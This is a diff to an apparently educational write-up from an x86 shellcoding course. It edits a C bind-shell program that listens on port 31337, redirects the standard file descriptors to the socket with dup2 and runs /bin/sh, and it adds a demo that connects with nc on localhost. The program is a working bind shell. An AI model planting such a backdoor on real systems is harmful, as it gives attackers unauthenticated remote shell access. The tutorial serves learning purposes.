@@ -39,8 +39,8 @@ int main()
     //Defining Address Structure
     struct sockaddr_in addr;
     addr.sin_family = AF_INET;
-    addr.sin_port = htons(1337); //Port no.
-    addr.sin_addr.s_addr = hton1(INADDR_ANY); //Use any interface to listen
+    addr.sin_port = htons(31337); //Port no.
+    addr.sin_addr.s_addr = htonl(INADDR_ANY); //Use any interface to listen
 
     //Create and Configure Socket
     int sockfd = socket(AF_INET, SOCK_STREAM, 0);
@@ -55,7 +55,7 @@ int main()
     int stdfd = accept(sockfd, NULL, NULL);
 
     //Duplicate Standard File Descriptors
-    for (int i = 0; i < 3; i++)
+    for (int i = 0; i <= 2; i++)
     {
         dup2(stdfd, i);
     }
@@ -157,3 +157,16 @@ We need to duplicate stdin, stdout and stderr to the socket in order to redirect
 execve("/bin/sh", NULL, NULL);
 return 0;
 ```
+To execute a shell, we use ```execve```, and the ```/bin/sh``` binary. Let's run this!
+```
+Terminal 1:
+$ gcc shell.c -o shell
+$ ./shell
+
+Terminal 2:
+$ nc -nv 127.0.0.1 31337
+(UNKNOWN) [127.0.0.1] 31337 (?) open
+pwd
+/home/kali/Desktop/SLAE_Practice/SLAEx86_Assignments/ass1
+```
+Now  that we know the structure of our program, let's start writing the assembly version!
